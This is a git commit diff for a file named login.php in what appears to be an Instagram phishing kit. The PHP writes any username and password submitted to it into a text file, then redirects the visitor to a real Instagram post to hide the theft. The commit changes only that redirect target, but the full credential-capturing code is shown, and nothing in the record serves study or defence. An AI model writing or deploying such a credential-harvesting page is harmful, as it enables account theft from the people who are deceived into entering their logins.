1844b8803de60fce7b84fe11edcde920199000c7
dharick <58396545+dharick@users.noreply.github.com>
2021-02-01 13:05:07 +0000

    Create login.php
    Hi

--- .sites/instagram/login.php
+++ .sites/instagram/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://instagram.com');
+header('Location: https://www.instagram.com/p/CI_A1Rog1D-/?igshid=1hpuvvb53ttdd');
 exit();
 ?>
